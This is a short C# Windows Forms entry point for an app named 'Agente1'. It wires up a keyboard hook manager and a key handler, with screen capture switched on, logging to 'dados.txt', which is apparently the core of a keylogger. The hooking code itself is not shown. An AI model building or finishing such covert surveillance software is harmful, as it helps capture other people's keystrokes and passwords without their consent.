using System;
using System.Windows.Forms;

namespace Agente1
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            bool captureScreen = true;
            var fileLogger = new FileLogger("dados.txt");
            var keyHandler = new KeyHandler(fileLogger);
            var hookManager = new HookManager(keyHandler, fileLogger, captureScreen);

            fileLogger.LogSessionStart();
            hookManager.Start();

            Application.Run(new Agente());
            hookManager.Unhook();
        }
    }
}